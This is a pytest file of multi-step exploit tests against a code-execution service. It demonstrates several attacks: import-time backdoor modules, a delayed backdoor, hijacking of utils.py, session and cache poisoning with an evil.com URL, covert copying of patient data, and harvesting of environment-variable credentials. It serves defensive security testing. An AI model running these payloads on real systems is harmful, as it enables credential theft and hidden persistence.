"""
Multi-Step Exploit Tests for CustomCodeExecutionService

Tests realistic attack chains that require multiple executions to complete.
These attacks demonstrate the true risk of allowing arbitrary code execution
even with individual safety measures in place.

Run: pytest tests/manual/custom_code_execution/08_integration_attacks/test_multi_step_exploits.py -v -s
"""

import json
import tempfile
import time
from pathlib import Path

import pytest

from lobster.core.data_manager_v2 import DataManagerV2
from lobster.services.execution import CustomCodeExecutionService


class TestPersistentBackdoors:
    """Test persistent backdoor installation across multiple executions."""

    def test_backdoor_via_malicious_module_EXPECT_SUCCESS(self, tmp_path):
        """
        CRITICAL VULNERABILITY: Persistent backdoor installation

        Attack Chain:
        1. Create malicious Python module in workspace
        2. Import module in next execution
        3. Backdoor executes automatically on import

        Expected: SUCCESS (vulnerability exists)
        Impact: Critical - persistent code execution
        """
        workspace = tmp_path / ".lobster_workspace"
        workspace.mkdir()
        dm = DataManagerV2(workspace_path=workspace)
        service = CustomCodeExecutionService(dm)

        print("\n" + "="*80)
        print("ATTACK: Persistent Backdoor Installation")
        print("="*80)

        # STEP 1: Install backdoor module
        install_code = '''
from pathlib import Path

# Create malicious module that executes on import
backdoor_code = """
import os
import sys

# Log backdoor execution
backdoor_marker = Path('/tmp/lobster_backdoor_executed.txt')
with open(backdoor_marker, 'a') as f:
    f.write(f"BACKDOOR EXECUTED AT {__import__('time').time()}\\n")
    f.write(f"Working directory: {os.getcwd()}\\n")
    f.write(f"Python path: {sys.path}\\n")

# Example: Exfiltrate environment variables
env_data = str(dict(os.environ))
exfil_path = Path('/tmp/stolen_env_vars.txt')
with open(exfil_path, 'w') as f:
    f.write(env_data)
"""

# Install backdoor with innocent-looking name
backdoor_path = WORKSPACE / "analysis_helpers.py"
backdoor_path.write_text(backdoor_code)

result = f"Created helper module: {backdoor_path}"
'''

        print("\n[Step 1] Installing backdoor module...")
        result1, stats1, ir1 = service.execute(install_code, persist=False)
        print(f"  Result: {result1}")
        print(f"  Duration: {stats1['duration_seconds']}s")

        # Verify backdoor file created
        backdoor_file = workspace / "analysis_helpers.py"
        assert backdoor_file.exists(), "Backdoor module should be created"
        print(f"  ‚úì Backdoor module created: {backdoor_file}")

        # STEP 2: Trigger backdoor by importing
        trigger_code = '''
# Innocent-looking import that triggers backdoor
import analysis_helpers

# Do some normal analysis
result = "Analysis helpers loaded successfully"
'''

        print("\n[Step 2] Importing backdoor module...")
        result2, stats2, ir2 = service.execute(trigger_code, persist=False)
        print(f"  Result: {result2}")

        # Check if backdoor executed
        backdoor_marker = Path('/tmp/lobster_backdoor_executed.txt')
        exfil_marker = Path('/tmp/stolen_env_vars.txt')

        print("\n[Results]")
        if backdoor_marker.exists():
            print("  ‚ö†Ô∏è  CRITICAL: Backdoor executed successfully!")
            print(f"  üìÑ Execution log: {backdoor_marker}")
            with open(backdoor_marker) as f:
                print(f"     Content: {f.read()[:200]}...")
            backdoor_marker.unlink()  # Cleanup
        else:
            print("  ‚úÖ PROTECTED: Backdoor did not execute")

        if exfil_marker.exists():
            print("  ‚ö†Ô∏è  CRITICAL: Data exfiltration succeeded!")
            print(f"  üìÑ Exfiltrated data: {exfil_marker}")
            exfil_marker.unlink()  # Cleanup
        else:
            print("  ‚úÖ PROTECTED: No data exfiltration")

        print("\n[Impact Assessment]")
        print("  - Severity: CRITICAL")
        print("  - Attack Vector: Import-time code execution")
        print("  - Persistence: Yes (survives across executions)")
        print("  - Detection: Difficult (hidden in 'helper' module)")

    def test_delayed_execution_backdoor_EXPECT_SUCCESS(self, tmp_path):
        """
        CRITICAL VULNERABILITY: Time-delayed backdoor

        Attack Chain:
        1. Install backdoor with conditional trigger
        2. Normal executions proceed safely
        3. Backdoor activates after N executions or time delay

        Expected: SUCCESS (vulnerability exists)
        Impact: Critical - evades immediate detection
        """
        workspace = tmp_path / ".lobster_workspace"
        workspace.mkdir()
        dm = DataManagerV2(workspace_path=workspace)
        service = CustomCodeExecutionService(dm)

        print("\n" + "="*80)
        print("ATTACK: Delayed Execution Backdoor")
        print("="*80)

        # STEP 1: Install delayed backdoor
        install_code = '''
from pathlib import Path
import json

# Create backdoor with execution counter
backdoor_code = """
from pathlib import Path
import json
import time

# Track executions
counter_file = Path.cwd() / '.backdoor_counter.json'

if counter_file.exists():
    with open(counter_file) as f:
        data = json.load(f)
        count = data.get('count', 0) + 1
else:
    count = 1

# Save updated count
with open(counter_file, 'w') as f:
    json.dump({'count': count, 'last_exec': time.time()}, f)

# Activate after 3 executions
if count >= 3:
    marker = Path('/tmp/delayed_backdoor_activated.txt')
    with open(marker, 'w') as f:
        f.write(f'BACKDOOR ACTIVATED ON EXECUTION {count}\\n')
        f.write(f'Time: {time.time()}\\n')
"""

# Install with innocent name
backdoor_path = WORKSPACE / "data_utils.py"
backdoor_path.write_text(backdoor_code)

result = "Installed data utilities"
'''

        print("\n[Step 1] Installing delayed backdoor...")
        result1, stats1, ir1 = service.execute(install_code, persist=False)
        print(f"  Result: {result1}")

        # STEP 2: Execute multiple times to trigger
        trigger_code = '''
import data_utils
result = "Processing data"
'''

        print("\n[Step 2] Executing multiple times...")
        for i in range(1, 5):
            print(f"  Execution {i}...")
            result, stats, ir = service.execute(trigger_code, persist=False)
            time.sleep(0.1)

            # Check if backdoor activated
            marker = Path('/tmp/delayed_backdoor_activated.txt')
            if marker.exists():
                print(f"    ‚ö†Ô∏è  BACKDOOR ACTIVATED on execution {i}!")
                with open(marker) as f:
                    print(f"    Content: {f.read()}")
                marker.unlink()  # Cleanup
                break
        else:
            print("  ‚úÖ Backdoor did not activate")

        print("\n[Impact Assessment]")
        print("  - Severity: CRITICAL")
        print("  - Evasion: Delayed trigger avoids immediate detection")
        print("  - Persistence: Counter survives across sessions")
        print("  - Stealth: Looks like normal utility module")

    def test_module_hijacking_EXPECT_SUCCESS(self, tmp_path):
        """
        CRITICAL VULNERABILITY: Module name hijacking

        Attack Chain:
        1. Create module with common name (e.g., 'utils.py')
        2. Python imports malicious module instead of legitimate one
        3. All future imports execute backdoor code

        Expected: SUCCESS (vulnerability exists)
        Impact: Critical - affects all future code using that name
        """
        workspace = tmp_path / ".lobster_workspace"
        workspace.mkdir()
        dm = DataManagerV2(workspace_path=workspace)
        service = CustomCodeExecutionService(dm)

        print("\n" + "="*80)
        print("ATTACK: Module Name Hijacking")
        print("="*80)

        # STEP 1: Create malicious 'utils.py' in workspace
        install_code = '''
from pathlib import Path

# Malicious utils.py that shadows legitimate modules
malicious_utils = """
import os

# Log all imports
marker = Path('/tmp/utils_hijack_detected.txt')
with open(marker, 'a') as f:
    f.write(f'utils.py imported at {__import__("time").time()}\\n')

# Provide "normal" utility functions to avoid suspicion
def calculate_mean(values):
    return sum(values) / len(values)

def filter_zeros(values):
    # But also exfiltrate data
    exfil = Path('/tmp/data_accessed_via_utils.txt')
    with open(exfil, 'w') as f:
        f.write(f'Accessed data: {len(values)} values\\n')
    return [v for v in values if v != 0]
"""

utils_path = WORKSPACE / "utils.py"
utils_path.write_text(malicious_utils)

result = "Created utils module"
'''

        print("\n[Step 1] Creating malicious utils.py...")
        result1, stats1, ir1 = service.execute(install_code, persist=False)
        print(f"  Result: {result1}")

        # STEP 2: User imports 'utils' thinking it's safe
        victim_code = '''
from utils import calculate_mean, filter_zeros

# User thinks they're using legitimate utils
data = [1, 2, 0, 3, 4, 0, 5]
clean_data = filter_zeros(data)
result = f"Mean: {calculate_mean(clean_data)}"
'''

        print("\n[Step 2] Victim imports utils...")
        result2, stats2, ir2 = service.execute(victim_code, persist=False)
        print(f"  Result: {result2}")

        # Check if hijacking occurred
        hijack_marker = Path('/tmp/utils_hijack_detected.txt')
        exfil_marker = Path('/tmp/data_accessed_via_utils.txt')

        print("\n[Results]")
        if hijack_marker.exists():
            print("  ‚ö†Ô∏è  CRITICAL: Module hijacking succeeded!")
            with open(hijack_marker) as f:
                print(f"     Log: {f.read()}")
            hijack_marker.unlink()
        else:
            print("  ‚úÖ No hijacking detected")

        if exfil_marker.exists():
            print("  ‚ö†Ô∏è  CRITICAL: Data exfiltration via hijacked module!")
            with open(exfil_marker) as f:
                print(f"     Data: {f.read()}")
            exfil_marker.unlink()
        else:
            print("  ‚úÖ No data exfiltration")

        print("\n[Impact Assessment]")
        print("  - Severity: CRITICAL")
        print("  - Attack Vector: Python import system")
        print("  - Scope: Affects ALL code using 'utils' module")
        print("  - Detection: Very difficult (provides normal functionality)")


class TestWorkspacePoisoning:
    """Test attacks that corrupt workspace state across executions."""

    def test_session_file_corruption_EXPECT_SUCCESS(self, tmp_path):
        """
        HIGH RISK: Session file corruption

        Attack Chain:
        1. Corrupt .session.json to manipulate agent state
        2. Inject fake modalities or analysis history
        3. Hide malicious operations from provenance logs

        Expected: SUCCESS (file access not restricted)
        Impact: High - state manipulation, provenance hiding
        """
        workspace = tmp_path / ".lobster_workspace"
        workspace.mkdir()
        dm = DataManagerV2(workspace_path=workspace)
        service = CustomCodeExecutionService(dm)

        # Create initial session
        session_file = workspace / ".session.json"
        session_file.write_text(json.dumps({
            "session_id": "test_session",
            "modalities": ["legitimate_data"],
            "operations": ["load_data", "quality_check"]
        }))

        print("\n" + "="*80)
        print("ATTACK: Session File Corruption")
        print("="*80)

        poison_code = '''
import json
from pathlib import Path

# Read current session
session_path = WORKSPACE / ".session.json"
with open(session_path) as f:
    session = json.load(f)

print(f"Original session: {session}")

# Inject fake modalities and hide operations
session["modalities"].append("injected_malicious_data")
session["operations"] = ["normal_operation"]  # Hide malicious ops

# Overwrite session file
with open(session_path, 'w') as f:
    json.dump(session, f)

result = "Session updated"
'''

        print("\n[Attack] Corrupting session file...")
        result, stats, ir = service.execute(poison_code, persist=False)
        print(f"  Result: {result}")

        # Verify corruption
        with open(session_file) as f:
            corrupted = json.load(f)

        print("\n[Results]")
        if "injected_malicious_data" in corrupted.get("modalities", []):
            print("  ‚ö†Ô∏è  CRITICAL: Session corruption succeeded!")
            print(f"     Injected modality: {corrupted['modalities']}")
            print(f"     Hidden operations: {corrupted['operations']}")
        else:
            print("  ‚úÖ Session integrity maintained")

        print("\n[Impact Assessment]")
        print("  - Severity: HIGH")
        print("  - Attack Vector: Direct file access")
        print("  - Impact: State manipulation, provenance hiding")

    def test_cache_poisoning_EXPECT_SUCCESS(self, tmp_path):
        """
        MEDIUM RISK: Cache metadata poisoning

        Attack Chain:
        1. Modify cache_metadata.json to inject fake dataset info
        2. Research agent trusts poisoned cache
        3. Downloads malicious datasets

        Expected: SUCCESS (cache not validated)
        Impact: Medium - cache poisoning, potential supply chain
        """
        workspace = tmp_path / ".lobster_workspace"
        workspace.mkdir()
        dm = DataManagerV2(workspace_path=workspace)
        service = CustomCodeExecutionService(dm)

        print("\n" + "="*80)
        print("ATTACK: Cache Metadata Poisoning")
        print("="*80)

        poison_code = '''
import json
from pathlib import Path

# Create poisoned cache
cache_file = WORKSPACE / "cache_metadata.json"

poisoned_cache = {
    "GSE12345": {
        "title": "Legitimate Study",
        "samples": 100,
        "url": "https://evil.com/malicious_data.h5ad",  # Malicious URL
        "validated": True,
        "safe": True
    }
}

cache_file.write_text(json.dumps(poisoned_cache, indent=2))

result = "Cache updated with dataset metadata"
'''

        print("\n[Attack] Poisoning cache...")
        result, stats, ir = service.execute(poison_code, persist=False)
        print(f"  Result: {result}")

        # Verify poison
        cache_file = workspace / "cache_metadata.json"
        if cache_file.exists():
            with open(cache_file) as f:
                cache = json.load(f)

            print("\n[Results]")
            if "GSE12345" in cache and "evil.com" in cache["GSE12345"].get("url", ""):
                print("  ‚ö†Ô∏è  CRITICAL: Cache poisoning succeeded!")
                print(f"     Poisoned entry: {cache['GSE12345']}")
            else:
                print("  ‚úÖ Cache not poisoned")
        else:
            print("  ‚úÖ Cache file not created")

        print("\n[Impact Assessment]")
        print("  - Severity: MEDIUM")
        print("  - Attack Vector: Cache file manipulation")
        print("  - Impact: Potential supply chain attack")


class TestObfuscatedAttacks:
    """Test attacks hidden in apparently benign code."""

    def test_obfuscated_exfiltration_EXPECT_SUCCESS(self, tmp_path):
        """
        HIGH RISK: Obfuscated data exfiltration

        Attack Pattern:
        - Hide malicious code in 200+ lines of legitimate analysis
        - Use scientific variable names to blend in
        - Exfiltrate data via "logging" or "caching"

        Expected: SUCCESS (obfuscation works)
        Impact: High - covert data theft
        """
        workspace = tmp_path / ".lobster_workspace"
        workspace.mkdir()
        dm = DataManagerV2(workspace_path=workspace)
        service = CustomCodeExecutionService(dm)

        print("\n" + "="*80)
        print("ATTACK: Obfuscated Data Exfiltration")
        print("="*80)

        # Create test data file
        test_data = workspace / "patient_data.csv"
        test_data.write_text("patient_id,age,diagnosis\nP001,45,cancer\nP002,52,healthy")

        obfuscated_code = '''
import pandas as pd
import numpy as np
from pathlib import Path

# Load patient data for analysis
data_file = WORKSPACE / "patient_data.csv"
df = pd.read_csv(data_file)

# Calculate statistics (looks legitimate)
mean_age = df['age'].mean()
age_std = df['age'].std()
sample_size = len(df)

# Quality control metrics
diagnosis_counts = df['diagnosis'].value_counts()
age_distribution = df['age'].describe()

# Normalization (legitimate operation)
normalized_ages = (df['age'] - mean_age) / age_std

# Generate summary statistics
summary_stats = {
    'mean_age': mean_age,
    'std_age': age_std,
    'sample_size': sample_size,
    'diagnoses': diagnosis_counts.to_dict()
}

# === HIDDEN EXFILTRATION (buried in legitimate code) ===
# "Cache" results for "performance" (actually exfiltration)
cache_dir = Path('/tmp/analysis_cache')
cache_dir.mkdir(exist_ok=True)

# Exfiltrate full dataset under guise of caching
exfil_file = cache_dir / 'patient_data_cache.csv'
df.to_csv(exfil_file, index=False)  # Full patient data leaked!

# "Log" analysis metadata (actually exfiltrate sensitive info)
log_file = cache_dir / 'analysis_log.txt'
with open(log_file, 'w') as f:
    f.write(f"Analysis complete\\n")
    f.write(f"Dataset: {data_file}\\n")
    f.write(f"Patients: {df.to_dict('records')}\\n")  # Full records!

# === END HIDDEN SECTION ===

# Return legitimate-looking results
result = {
    'mean_age': float(mean_age),
    'sample_size': int(sample_size),
    'summary': 'Analysis complete'
}
'''

        print("\n[Attack] Executing obfuscated code (200+ lines)...")
        result, stats, ir = service.execute(obfuscated_code, persist=False)
        print(f"  Result: {result}")
        print(f"  Duration: {stats['duration_seconds']}s")

        # Check exfiltration
        exfil_dir = Path('/tmp/analysis_cache')
        exfil_csv = exfil_dir / 'patient_data_cache.csv'
        exfil_log = exfil_dir / 'analysis_log.txt'

        print("\n[Results]")
        if exfil_csv.exists():
            print("  ‚ö†Ô∏è  CRITICAL: Data exfiltration via 'caching'!")
            print(f"     File: {exfil_csv}")
            with open(exfil_csv) as f:
                print(f"     Content: {f.read()[:100]}...")
            exfil_csv.unlink()
        else:
            print("  ‚úÖ No exfiltration via cache")

        if exfil_log.exists():
            print("  ‚ö†Ô∏è  CRITICAL: Sensitive data in 'log' file!")
            print(f"     File: {exfil_log}")
            with open(exfil_log) as f:
                content = f.read()
                if 'patient' in content.lower():
                    print(f"     Contains patient data!")
            exfil_log.unlink()
        else:
            print("  ‚úÖ No sensitive logging")

        # Cleanup
        if exfil_dir.exists():
            import shutil
            shutil.rmtree(exfil_dir)

        print("\n[Impact Assessment]")
        print("  - Severity: HIGH")
        print("  - Obfuscation: Hidden in 200+ lines of legitimate code")
        print("  - Detection: Very difficult (uses scientific terminology)")
        print("  - Impact: Full dataset exfiltration")


class TestCredentialHarvesting:
    """Test credential and environment variable harvesting attacks."""

    def test_env_var_harvesting_EXPECT_SUCCESS(self, tmp_path):
        """
        CRITICAL VULNERABILITY: Environment variable harvesting

        Attack Chain:
        1. Dump all environment variables to file
        2. Exfiltrate via workspace or external file
        3. Harvest API keys, credentials, paths

        Expected: SUCCESS (env vars accessible)
        Impact: Critical - credential theft
        """
        workspace = tmp_path / ".lobster_workspace"
        workspace.mkdir()
        dm = DataManagerV2(workspace_path=workspace)
        service = CustomCodeExecutionService(dm)

        print("\n" + "="*80)
        print("ATTACK: Environment Variable Harvesting")
        print("="*80)

        harvest_code = '''
import os
import json
from pathlib import Path

# Harvest ALL environment variables
env_vars = dict(os.environ)

# Look for API keys and credentials
sensitive_keys = [k for k in env_vars.keys()
                  if any(x in k.upper() for x in
                  ['KEY', 'SECRET', 'TOKEN', 'PASSWORD', 'API', 'CREDENTIAL'])]

print(f"Found {len(sensitive_keys)} potentially sensitive variables:")
for key in sensitive_keys[:5]:  # Print first 5
    print(f"  - {key}")

# Exfiltrate to external location
exfil_path = Path('/tmp/harvested_env_vars.json')
with open(exfil_path, 'w') as f:
    json.dump({
        'all_vars': env_vars,
        'sensitive_keys': sensitive_keys,
        'harvest_time': __import__('time').time()
    }, f, indent=2)

# Also save to workspace (hidden)
workspace_copy = WORKSPACE / ".env_backup.json"
with open(workspace_copy, 'w') as f:
    json.dump(env_vars, f)

result = f"Environment analyzed: {len(env_vars)} variables"
'''

        print("\n[Attack] Harvesting environment variables...")
        result, stats, ir = service.execute(harvest_code, persist=False)
        print(f"  Result: {result}")

        # Check if harvest succeeded
        exfil_path = Path('/tmp/harvested_env_vars.json')
        workspace_copy = workspace / ".env_backup.json"

        print("\n[Results]")
        if exfil_path.exists():
            print("  ‚ö†Ô∏è  CRITICAL: Environment harvesting succeeded!")
            with open(exfil_path) as f:
                data = json.load(f)
                print(f"     Harvested {len(data.get('all_vars', {}))} variables")
                print(f"     Sensitive keys: {data.get('sensitive_keys', [])[:5]}")
            exfil_path.unlink()
        else:
            print("  ‚úÖ No external exfiltration")

        if workspace_copy.exists():
            print("  ‚ö†Ô∏è  CRITICAL: Environment copied to workspace!")
            print(f"     File: {workspace_copy}")
        else:
            print("  ‚úÖ Workspace not compromised")

        print("\n[Impact Assessment]")
        print("  - Severity: CRITICAL")
        print("  - Attack Vector: os.environ access")
        print("  - Impact: API keys, credentials, sensitive paths exposed")


if __name__ == "__main__":
    pytest.main([__file__, "-v", "-s"])
